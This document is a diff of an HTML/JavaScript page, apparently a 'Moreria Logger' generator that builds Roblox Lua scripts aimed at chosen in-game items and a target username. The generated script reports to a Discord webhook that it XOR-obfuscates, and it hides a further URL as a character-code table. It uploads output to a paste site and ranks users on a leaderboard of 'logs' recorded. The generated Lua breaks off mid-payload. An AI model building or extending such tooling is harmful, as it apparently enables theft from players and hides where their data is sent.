+  .toast.error { border-color: var(--danger); }
 
   /* ── UTILITY ── */
-  .mt-2 { margin-top: 0.6rem; }
+  .mt-2 { margin-top: 0.8rem; }
   .gap-row { display: flex; gap: 0.5rem; }
   .flex-1 { flex: 1; }
-  textarea.input { resize: vertical; min-height: 70px; }
+  textarea.input { resize: vertical; min-height: 80px; }
+  
+  @media (max-width: 768px) {
+    .top-nav { flex-direction: column; gap: 1rem; padding: 1rem; }
+    .nav-pill { width: 100%; overflow-x: auto; justify-content: center; }
+    .podium-grid { flex-direction: column; align-items: center; }
+    .podium-card { width: 100%; max-width: 300px; }
+    .podium-card.first { order: -1; }
+    .podium-card.second { order: 0; }
+    .podium-card.third { order: 1; }
+  }
 </style>
 </head>
 <body>
 
-<!-- ── TOP BAR ── -->
-<div class="top-bar">
-  <div class="top-left">
-    <div class="brand">STATICS <em>/ MORERIA</em></div>
-    <div class="counter">
-      <div class="counter-dot"></div>
-      <span>Generated:</span>
-      <span class="counter-num" id="counterNum">0</span>
-    </div>
+<!-- ── TOP NAVIGATION ── -->
+<div class="top-nav">
+  <div class="brand">32e4 <em>/ Statics - Moreria</em></div>
+  
+  <div class="nav-pill" id="navPill">
+    <button class="nav-item active" onclick="switchTab('generator')">
+      <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+      Generator
+    </button>
+    <button class="nav-item" onclick="switchTab('logs')">
+      <svg viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zM7 7v2h14V7H7z"/></svg>
+      Logs
+    </button>
+    <button class="nav-item" onclick="switchTab('leaderboard')">
+      <svg viewBox="0 0 24 24"><path d="M7.5 21.5h9v-2h-9v2zm-4-4h17v-2h-17v2zm3-4h11v-2h-11v2zm-6-4h23v-2H.5v2zm11.5-4h5v-2h-5v2z"/></svg>
+      Leaderboard
+    </button>
+    <button class="nav-item" onclick="switchTab('profile')">
+      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      Profile
+    </button>
   </div>
-  <div class="login-area">
+
+  <div class="user-area">
     <button class="btn-discord" id="loginBtn" onclick="loginWithDiscord()">
       <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
       <span>Sign in</span>
@@ -620,69 +496,13 @@
     <div class="user-chip" id="userChip">
       <img class="user-avatar" id="userAvatar" src="" alt="">
       <span class="user-name" id="userNameDisplay"></span>
-      <span class="role-badge" id="topRoleBadge" style="display:none"></span>
-      <button class="btn-admin" id="adminOpenBtn" onclick="openAdmin()">Admin</button>
-      <button class="btn-logout" onclick="logout()">Exit</button>
+      <button class="btn-logout" onclick="logout()" style="background:none;border:none;color:var(--muted);cursor:pointer;font-size:0.7rem;margin-left:0.5rem;">✕</button>
     </div>
   </div>
 </div>
 
-<!-- ── LOGIN MODAL ── -->
-<div class="modal-overlay hidden" id="loginModal">
-  <div class="modal-box">
-    <div class="eyebrow">Authentication</div>
-    <h2>Connect Discord</h2>
-    <p>Sign in to generate scripts and track your activity.</p>
-    <div class="auth-status" id="loginStatus" data-state="idle">READY</div>
-    <button class="btn-discord" id="loginModalBtn" onclick="loginWithDiscord()" style="margin:0 auto;">
-      <svg viewBox="0 0 24 24" fill="currentColor" style="width:14px;height:14px"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
-      <span>Sign in with Discord</span>
-    </button>
-    <p class="auth-note">Identity only. Webhooks stay local.</p>
-  </div>
-</div>
-
-<!-- ── ADMIN MODAL ── -->
-<div class="modal-overlay hidden" id="adminModal">
-  <div class="admin-box">
-    <div class="admin-head">
-      <h2>Admin</h2>
-      <button class="admin-close" onclick="closeModal('adminModal')">✕</button>
-    </div>
-    <div class="admin-tabs">
-      <button class="admin-tab active" onclick="switchAdminTab('roles', this)">Roles</button>
-      <button class="admin-tab" onclick="switchAdminTab('users', this)">Users</button>
-    </div>
-    <div class="admin-body">
-      <div class="pane active" id="pane-roles">
-        <label class="lbl">New role</label>
-        <div class="gap-row" style="margin-bottom:0.8rem;">
-          <input class="input flex-1" id="newRoleName" placeholder="Name">
-          <input type="color" id="newRoleColor" value="#ffffff" style="width:36px;height:34px;border:1px solid var(--border);border-radius:6px;background:var(--bg);cursor:pointer;padding:2px;">
-          <button class="btn-sm" onclick="addRole()">Add</button>
-        </div>
-        <div id="rolesList"></div>
-      </div>
-      <div class="pane" id="pane-users">
-        <div id="usersList"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ── MAIN CONTENT ── -->
-<div class="container" id="mainContent">
-  <div class="page-eyebrow">01 / Moreria Generator</div>
-  <h1 class="page-title">MORERIA</h1>
-  <div class="page-title-sub">LOGGER</div>
-  <p class="page-desc">SELECT TARGETS · CONFIGURE WEBHOOK · GENERATE</p>
-
-  <div class="tool-header">
-    <h1>Script Builder</h1>
-    <p class="tagline">Statics Hub × Moreria</p>
-  </div>
-
-  <!-- ANIMALS -->
+<!-- ── TAB: GENERATOR ── -->
+<div class="container active" id="tab-generator">
   <div class="panel">
     <div class="panel-head"><div class="dot active"></div><span class="panel-title">Target Brainrots</span></div>
     <div class="panel-body">
@@ -691,7 +511,7 @@
         <button class="btn-sm" onclick="selectAll()">All</button>
         <button class="btn-sm danger" onclick="clearAll()">Clear</button>
       </div>
-      <div class="animal-list" id="animalList"></div>
+      <div class="item-list" id="animalList"></div>
       <div class="gap-row mt-2">
         <input class="input flex-1" id="customBrainrotName" placeholder="Custom brainrot name...">
         <button class="btn-sm" onclick="addCustomBrainrot()">Add</button>
@@ -708,8 +528,7 @@
     </div>
   </div>
 
-  <!-- BASES (blue theme) -->
-  <div class="panel bases-panel">
+  <div class="panel">
     <div class="panel-head"><div class="dot active"></div><span class="panel-title">Target Bases</span></div>
     <div class="panel-body">
       <div class="search-row">
@@ -717,7 +536,7 @@
         <button class="btn-sm" onclick="selectAllBases()">All</button>
         <button class="btn-sm danger" onclick="clearAllBases()">Clear</button>
       </div>
-      <div class="animal-list" id="baseList"></div>
+      <div class="item-list" id="baseList"></div>
       <div class="gap-row mt-2">
         <input class="input flex-1" id="customBaseName" placeholder="Custom base name...">
         <button class="btn-sm" onclick="addCustomBase()">Add</button>
@@ -734,20 +553,15 @@
     </div>
   </div>
 
-  <!-- USERNAME -->
   <div class="panel">
     <div class="panel-head"><div class="dot"></div><span class="panel-title">Target Username</span></div>
     <div class="panel-body">
       <label class="lbl">Roblox username</label>
-      <div style="position:relative;">
-        <input class="input" id="usernameInput" placeholder="Builderman" autocomplete="off" spellcheck="false">
-        <div id="usernameSuggestions"></div>
-      </div>
+      <input class="input" id="usernameInput" placeholder="Builderman" autocomplete="off" spellcheck="false">
       <p class="hint" id="usernameHint">Minimum 3 characters.</p>
     </div>
   </div>
 
-  <!-- WEBHOOK -->
   <div class="panel">
     <div class="panel-head"><div class="dot"></div><span class="panel-title">Discord Webhook</span></div>
     <div class="panel-body">
@@ -759,7 +573,6 @@
 
   <button class="btn-gen" id="genBtn" onclick="generate()">⚡ Generate Script</button>
 
-  <!-- OUTPUT -->
   <div class="panel">
     <div class="out-head">
       <div class="dot"></div>
@@ -772,6 +585,74 @@
   </div>
 </div>
 
+<!-- ── TAB: LOGS ── -->
+<div class="container" id="tab-logs">
+  <div class="lb-header">
+    <h1>Activity Logs</h1>
+    <p>Recent script generations across the platform.</p>
+  </div>
+  <div class="lb-list">
+    <div class="lb-list-head">Recent Generations</div>
+    <div id="logsContainer"></div>
+  </div>
+</div>
+
+<!-- ── TAB: LEADERBOARD ── -->
+<div class="container" id="tab-leaderboard">
+  <div class="lb-header">
+    <h1><svg viewBox="0 0 24 24" fill="currentColor"><path d="M2 21h20v-2H2v2zm0-4h20v-2H2v2zm0-4h20v-2H2v2zm11.5-4h5v-2h-5v2zm-11.5 0h9v-2H2v2z"/></svg> Leaderboard</h1>
+    <p>Distinct logs each account recorded. Dupes don't count.</p>
+  </div>
+
+  <div class="podium-grid" id="podiumGrid">
+    <!-- Injected via JS -->
+  </div>
+
+  <div class="lb-list">
+    <div class="lb-list-head">Rest of the board</div>
+    <div id="lbContainer"></div>
+  </div>
+</div>
+
+<!-- ── TAB: PROFILE ── -->
+<div class="container" id="tab-profile">
+  <div class="lb-header">
+    <h1>Profile</h1>
+    <p>Your generator statistics.</p>
+  </div>
+  <div class="panel" style="max-width:500px;margin:0 auto;">
+    <div class="panel-body" style="text-align:center;padding:3rem 1.5rem;">
+      <img id="profileAvatar" src="" style="width:100px;height:100px;border-radius:50%;border:2px solid var(--border);margin-bottom:1rem;display:none;">
+      <h2 id="profileName" style="margin-bottom:0.5rem;">Not logged in</h2>
+      <p id="profileHandle" style="color:var(--muted);margin-bottom:2rem;">Sign in to track your stats</p>
+      
+      <div style="display:flex;justify-content:center;gap:2rem;">
+        <div>
+          <div style="font-size:2rem;font-weight:700;font-family:'Space Grotesk',sans-serif;" id="profileGenerations">0</div>
+          <div style="font-size:0.75rem;color:var(--muted);text-transform:uppercase;">Total Generations</div>
+        </div>
+        <div>
+          <div style="font-size:2rem;font-weight:700;font-family:'Space Grotesk',sans-serif;" id="profileRank">#-</div>
+          <div style="font-size:0.75rem;color:var(--muted);text-transform:uppercase;">Global Rank</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── LOGIN MODAL ── -->
+<div class="modal-overlay hidden" id="loginModal">
+  <div class="modal-box">
+    <h2>Connect Discord</h2>
+    <p>Sign in to generate scripts and track your activity.</p>
+    <div class="auth-status" id="loginStatus" data-state="idle">READY</div>
+    <button class="btn-discord" id="loginModalBtn" onclick="loginWithDiscord()" style="margin:0 auto;">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+      <span>Sign in with Discord</span>
+    </button>
+  </div>
+</div>
+
 <div class="toast" id="toast"></div>
 
 <script>
@@ -780,50 +661,70 @@ const DISCORD_CLIENT_ID = '1368253122299822292';
 const DISCORD_REDIRECT_URI = window.location.origin + window.location.pathname;
 const DISCORD_AUTH_TIMEOUT_MS = 12000;
 
-const ADMIN_MAP = {
-  'bythbzen':    { title: 'Founder', color: '#ffffff' },
-  'visualcoder': { title: 'Owner',   color: '#ffffff' },
-  'levraimlk':   { title: 'Developer', color: '#ffffff' }
-};
-
 // ── STATE ──
 let selected = new Set();
 let selectedBases = new Set();
 let currentUser = null;
 let authRequestActive = false;
 
-// ── COUNTER ──
-function getCount() { return parseInt(localStorage.getItem('statics_moreria_count') || '0'); }
-function incrementCount() {
-  const n = getCount() + 1;
-  localStorage.setItem('statics_moreria_count', n);
-  document.getElementById('counterNum').textContent = n;
+// ── TABS ──
+function switchTab(tabId) {
+  document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  
+  document.getElementById('tab-' + tabId).classList.add('active');
+  event.currentTarget.classList.add('active');
+
+  if (tabId === 'leaderboard') renderLeaderboard();
+  if (tabId === 'logs') renderLogs();
+  if (tabId === 'profile') renderProfile();
 }
-function initCounter() { document.getElementById('counterNum').textContent = getCount(); }
+
+// ── DATA TRACKING ──
+function getGlobalLogs() {
+  return JSON.parse(localStorage.getItem('statics_global_logs') || '{"users":{}, "history":[]}');
+}
+function saveGlobalLogs(data) {
+  localStorage.setItem('statics_global_logs', JSON.stringify(data));
+}
+
+function trackGeneration(username, globalName, avatar, brainrots, bases) {
+  const data = getGlobalLogs();
+  
+  if (!data.users[username]) {
+    data.users[username] = {
+      username: username,
+      global_name: globalName || username,
+      avatar: avatar,
+      count: 0
+    };
+  }
+  data.users[username].count++;
+  data.users[username].global_name = globalName || username;
+  data.users[username].avatar = avatar;
+
+  data.history.unshift({
+    username: username,
+    global_name: globalName || username,
+    avatar: avatar,
+    time: Date.now(),
+    details: `${brainrots.size} Brainrots, ${bases.size} Bases`
+  });
+  
+  if (data.history.length > 50) data.history.pop();
+  
+  saveGlobalLogs(data);
+}
 
 // ── DISCORD AUTH ──
 function setAuthState(state, msg) {
   const el = document.getElementById('loginStatus');
   if (el) { el.dataset.state = state; el.textContent = msg; }
 }
-function setAuthLoading(v) {
-  ['loginBtn', 'loginModalBtn'].forEach(id => {
-    const b = document.getElementById(id);
-    if (!b) return;
-    b.disabled = v;
-    const span = b.querySelector('span');
-    if (span) span.textContent = v ? 'Opening...' : 'Sign in';
-  });
-}
-function clearStoredUser() {
-  localStorage.removeItem('statics_moreria_discord_user');
-  currentUser = null;
-}
 function loginWithDiscord() {
   if (authRequestActive) return;
   authRequestActive = true;
   setAuthState('loading', 'OPENING DISCORD');
-  setAuthLoading(true);
   sessionStorage.setItem('statics_moreria_pending', '1');
   const p = new URLSearchParams({
     client_id: DISCORD_CLIENT_ID,
@@ -841,7 +742,6 @@ async function handleCallback() {
     history.replaceState(null, '', location.pathname + location.search);
     sessionStorage.removeItem('statics_moreria_pending');
     authRequestActive = false;
-    setAuthLoading(false);
     setAuthState('error', 'CANCELLED');
     showLoginGate();
     return;
@@ -868,7 +768,7 @@ async function handleCallback() {
       username: u.username,
       global_name: u.global_name || u.username,
       avatar: u.avatar
-        ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=64`
+        ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=128`
         : getDefaultAvatar(u.id),
       token,
       expires_at: Date.now() + Math.max(exp, 300) * 1000
@@ -878,11 +778,9 @@ async function handleCallback() {
     showToast('Signed in as ' + data.global_name, 'success');
   } catch (e) {
     if (tid) clearTimeout(tid);
-    clearStoredUser();
+    localStorage.removeItem('statics_moreria_discord_user');
     setAuthState('error', e.name === 'AbortError' ? 'TIMED OUT' : 'VERIFY FAILED');
-    setAuthLoading(false);
     showLoginGate();
-    showToast('Sign-in failed', 'error');
   } finally { authRequestActive = false; }
 }
 function getDefaultAvatar(id) {
@@ -899,186 +797,362 @@ function loadStored() {
   if (!s) return;
   try {
     const u = JSON.parse(s);
-    if (!u.token || (u.expires_at && Date.now() >= u.expires_at)) { clearStoredUser(); return; }
+    if (!u.token || (u.expires_at && Date.now() >= u.expires_at)) return;
     setCurrentUser(u);
-  } catch { clearStoredUser(); }
+  } catch {}
 }
 function setCurrentUser(u) {
   currentUser = u;
   document.getElementById('loginModal').classList.add('hidden');
-  setAuthState('success', 'CONNECTED');
-  setAuthLoading(false);
   document.getElementById('userChip').classList.add('show');
   document.getElementById('loginBtn').style.display = 'none';
   document.getElementById('userAvatar').src = u.avatar;
-  document.getElementById('userNameDisplay').textContent = u.global_name || u.username;
-  if (ADMIN_MAP[u.username]) document.getElementById('adminOpenBtn').classList.add('show');
-  applyRoleBadge(u.username);
-}
-function applyRoleBadge(username) {
-  const el = document.getElementById('topRoleBadge');
-  if (ADMIN_MAP[username]) {
-    const a = ADMIN_MAP[username];
-    el.textContent = a.title;
-    el.style.background = 'rgba(255,255,255,0.1)';
-    el.style.color = a.color;
-    el.style.border = '1px solid ' + a.color + '44';
-    el.style.display = 'inline';
-    return;
-  }
-  const ur = getUserRoles();
-  const rid = ur[username];
-  if (rid) {
-    const roles = getRoles();
-    const r = roles.find(x => x.id === rid);
-    if (r) {
-      el.textContent = r.name;
-      el.style.background = r.color + '22';
-      el.style.color = r.color;
-      el.style.border = '1px solid ' + r.color + '44';
-      el.style.display = 'inline';
-      return;
-    }
-  }
-  el.style.display = 'none';
+  document.getElementById('userNameDisplay').textContent = u.global_name;
 }
 function logout() {
   localStorage.removeItem('statics_moreria_discord_user');
-  sessionStorage.removeItem('statics_moreria_pending');
-  authRequestActive = false;
   currentUser = null;
   document.getElementById('userChip').classList.remove('show');
   document.getElementById('loginBtn').style.display = 'flex';
-  setAuthLoading(false);
-  setAuthState('idle', 'READY');
-  document.getElementById('adminOpenBtn').classList.remove('show');
   showLoginGate();
+  if(document.getElementById('tab-profile').classList.contains('active')) renderProfile();
 }
 
-// ── ADMIN DATA ──
-function getRoles() { try { return JSON.parse(localStorage.getItem('statics_moreria_roles') || '[]'); } catch { return []; } }
-function saveRoles(r) { localStorage.setItem('statics_moreria_roles', JSON.stringify(r)); }
-function getUserRoles() { try { return JSON.parse(localStorage.getItem('statics_moreria_user_roles') || '{}'); } catch { return {}; } }
-function saveUserRoles(r) { localStorage.setItem('statics_moreria_user_roles', JSON.stringify(r)); }
-function getKnownUsers() { try { return JSON.parse(localStorage.getItem('statics_moreria_known_users') || '[]'); } catch { return []; } }
-function saveKnownUsers(u) { localStorage.setItem('statics_moreria_known_users', JSON.stringify(u)); }
+// ── GENERATOR LOGIC ──
+function addCustomBrainrot() {
+  const v = document.getElementById('customBrainrotName').value.trim();
+  if (!v) return;
+  selected.add(v);
+  renderList(document.getElementById('searchBox').value);
+  document.getElementById('customBrainrotName').value = '';
+}
+function parsePastedList() {
+  const t = document.getElementById('pasteCustomListTextarea').value.trim();
+  if (!t) return;
+  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi;
+  let m;
+  while ((m = re.exec(t)) !== null) { const n = m[1].trim(); if (n) selected.add(n); }
+  renderList(document.getElementById('searchBox').value);
+  document.getElementById('pasteCustomListTextarea').value = '';
+}
+function renderList(filter) {
+  const q = (filter || '').toLowerCase();
+  const list = document.getElementById('animalList');
+  list.innerHTML = '';
+  ANIMALS.forEach(a => {
+    if (q && !a.name.toLowerCase().includes(q)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selected.has(a.name) ? ' on' : '');
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = selected.has(a.name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(a.name); });
+    const nm = document.createElement('span'); nm.className = 'a-name'; nm.textContent = a.name;
+    const bd = document.createElement('span'); bd.className = 'badge'; bd.textContent = a.rarity;
+    const mp = document.createElement('span'); mp.className = 'a-mps'; mp.textContent = a.mps;
+    row.append(cb, nm, bd, mp);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(a.name); });
+    list.appendChild(row);
+  });
+  selected.forEach(n => {
+    if (ANIMALS.some(a => a.name === n)) return;
+    const row = document.createElement('div'); row.className = 'a-item on';
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = true;
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(n); });
+    const nm = document.createElement('span'); nm.className = 'a-name'; nm.textContent = n;
+    const bd = document.createElement('span'); bd.className = 'badge'; bd.textContent = 'Custom';
+    row.append(cb, nm, bd);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(n); });
+    list.appendChild(row);
+  });
+  document.getElementById('selNum').textContent = selected.size;
+}
+function toggle(n) {
+  selected.has(n) ? selected.delete(n) : selected.add(n);
+  renderList(document.getElementById('searchBox').value);
+}
+function filterList() { renderList(document.getElementById('searchBox').value); }
+function selectAll() { ANIMALS.forEach(a => selected.add(a.name)); renderList(document.getElementById('searchBox').value); }
+function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
-function trackUser(u) {
-  const users = getKnownUsers();
-  const i = users.findIndex(x => x.id === u.id);
-  const e = { id: u.id, username: u.username, global_name: u.global_name, avatar: u.avatar };
-  if (i >= 0) users[i] = e; else users.push(e);
-  saveKnownUsers(users);
+function addCustomBase() {
+  const v = document.getElementById('customBaseName').value.trim();
+  if (!v) return;
+  selectedBases.add(v);
+  renderBaseList(document.getElementById('baseSearchBox').value);
+  document.getElementById('customBaseName').value = '';
 }
+function parsePastedBaseList() {
+  const t = document.getElementById('pasteCustomBaseTextarea').value.trim();
+  if (!t) return;
+  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi;
+  let m;
+  while ((m = re.exec(t)) !== null) { const n = m[1].trim(); if (n) selectedBases.add(n); }
+  renderBaseList(document.getElementById('baseSearchBox').value);
+  document.getElementById('pasteCustomBaseTextarea').value = '';
+}
+function renderBaseList(filter) {
+  const q = (filter || '').toLowerCase();
+  const list = document.getElementById('baseList');
+  list.innerHTML = '';
+  BASES.forEach(b => {
+    if (q && !b.name.toLowerCase().includes(q)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selectedBases.has(b.name) ? ' on' : '');
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = selectedBases.has(b.name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggleBase(b.name); });
+    const nm = document.createElement('span'); nm.className = 'a-name'; nm.textContent = b.name;
+    const bd = document.createElement('span'); bd.className = 'badge'; bd.textContent = b.rarity;
+    row.append(cb, nm, bd);
+    row.addEventListener('click', e => { if (e.target !== cb) toggleBase(b.name); });
+    list.appendChild(row);
+  });
+  selectedBases.forEach(n => {
+    if (BASES.some(b => b.name === n)) return;
+    const row = document.createElement('div'); row.className = 'a-item on';
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = true;
+    cb.addEventListener('change', e => { e.stopPropagation(); toggleBase(n); });
+    const nm = document.createElement('span'); nm.className = 'a-name'; nm.textContent = n;
+    const bd = document.createElement('span'); bd.className = 'badge'; bd.textContent = 'Custom';
+    row.append(cb, nm, bd);
+    row.addEventListener('click', e => { if (e.target !== cb) toggleBase(n); });
+    list.appendChild(row);
+  });
+  document.getElementById('baseSelNum').textContent = selectedBases.size;
+}
+function toggleBase(n) {
+  selectedBases.has(n) ? selectedBases.delete(n) : selectedBases.add(n);
+  renderBaseList(document.getElementById('baseSearchBox').value);
+}
+function filterBaseList() { renderBaseList(document.getElementById('baseSearchBox').value); }
+function selectAllBases() { BASES.forEach(b => selectedBases.add(b.name)); renderBaseList(document.getElementById('baseSearchBox').value); }
+function clearAllBases() { selectedBases.clear(); renderBaseList(document.getElementById('baseSearchBox').value); }
 
-function openAdmin() {
-  if (!currentUser || !ADMIN_MAP[currentUser.username]) { showToast('Access denied', 'error'); return; }
-  renderRoles(); renderUsers();
-  document.getElementById('adminModal').classList.remove('hidden');
-}
-function switchAdminTab(tab, btn) {
-  document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.pane').forEach(p => p.classList.remove('active'));
-  btn.classList.add('active');
-  document.getElementById('pane-' + tab).classList.add('active');
-}
-function addRole() {
-  const name = document.getElementById('newRoleName').value.trim();
-  const color = document.getElementById('newRoleColor').value;
-  if (!name) { showToast('Enter a name', 'error'); return; }
-  const roles = getRoles();
-  if (roles.some(r => r.name.toLowerCase() === name.toLowerCase())) { showToast('Exists', 'error'); return; }
-  roles.push({ id: Date.now().toString(), name, color });
-  saveRoles(roles);
-  document.getElementById('newRoleName').value = '';
-  renderRoles(); renderUsers();
-  showToast('Role added', 'success');
-}
-function deleteRole(id) {
-  saveRoles(getRoles().filter(r => r.id !== id));
-  const ur = getUserRoles();
-  for (const k in ur) { if (ur[k] === id) delete ur[k]; }
-  saveUserRoles(ur);
-  renderRoles(); renderUsers();
-}
-function renderRoles() {
-  const list = document.getElementById('rolesList');
-  const roles = getRoles();
-  if (!roles.length) {
-    list.innerHTML = '<p style="font-family:\'Share Tech Mono\',monospace;font-size:0.65rem;color:var(--muted);text-align:center;padding:1.5rem;font-style:italic;">No roles yet</p>';
-    return;
+// ── WEBHOOK OBFUSCATION ──
+function obfuscateWebhook(url) {
+  const bytes = [];
+  for (let i = 0; i < url.length; i++) {
+    bytes.push(url.charCodeAt(i) ^ (0x5A + (i % 7)));
   }
-  list.innerHTML = roles.map(r => `
-    <div style="display:flex;align-items:center;gap:0.5rem;padding:0.45rem 0.7rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin-bottom:0.4rem;">
-      <span style="width:10px;height:10px;border-radius:50%;background:${r.color};flex-shrink:0;"></span>
-      <span style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;flex:1;color:var(--text);">${esc(r.name)}</span>
-      <button onclick="deleteRole('${r.id}')" style="padding:0.15rem 0.4rem;background:transparent;border:1px solid var(--border-strong);border-radius:3px;color:var(--danger);font-family:'Share Tech Mono',monospace;font-size:0.55rem;cursor:pointer;">Del</button>
-    </div>
-  `).join('');
+  return bytes.join(',');
 }
-function renderUsers() {
-  const c = document.getElementById('usersList');
-  const users = getKnownUsers();
-  const roles = getRoles();
-  const ur = getUserRoles();
-  if (!users.length) {
-    c.innerHTML = '<p style="font-family:\'Share Tech Mono\',monospace;font-size:0.65rem;color:var(--muted);text-align:center;padding:1.5rem;font-style:italic;">No users yet</p>';
-    return;
+
+// ── GENERATE ──
+async function uploadToPastefy(script) {
+  try {
+    const res = await fetch('https://pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: '32e4 Statics Moreria', content: script })
+    });
+    const d = await res.json();
+    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
+  } catch { return null; }
+}
+
+async function generate() {
+  if (!currentUser) { document.getElementById('loginModal').classList.remove('hidden'); return; }
+  const btn = document.getElementById('genBtn');
+  const out = document.getElementById('outputBlock');
+  if (btn.disabled) return;
+  
+  const username = document.getElementById('usernameInput').value.trim();
+  const webhook = document.getElementById('webhookInput').value.trim();
+  
+  if (selected.size === 0 && selectedBases.size === 0) { showToast('Select at least one target', 'error'); return; }
+  if (username.length < 3) { showToast('Username must be 3+ chars', 'error'); return; }
+  if (!webhook.startsWith('https://discord.com/api/webhooks/')) { showToast('Invalid webhook', 'error'); return; }
+
+  btn.disabled = true;
+  btn.textContent = 'Generating...';
+  
+  try {
+    const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+    const baseLines = [...selectedBases].map(n => `    ["${n}"] = true,`).join('\n');
+    const obf = obfuscateWebhook(webhook);
+
+    const script = `-- 32e4 / Statics - Moreria
+-- Generated: ${new Date().toISOString()}
+
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_BRAINROT = {
+${brainrotLines || '    -- none selected'}
+}
+getgenv().TARGET_BASES = {
+${baseLines || '    -- none selected'}
+}
+
+-- Obfuscated payload
+local _W = {${obf}}
+local _K = 0x5A
+local _M = 7
+local _S = ""
+for _i = 1, #_W do
+    _S = _S .. string.char(bit32.bxor(_W[_i], _K + ((_i - 1) % _M)))
+end
+getgenv().WEBHOOK_URL = _S
+
+local C = string.char
+local T = table.concat
+local K = {
+    104,116,116,112,115,58,47,47,
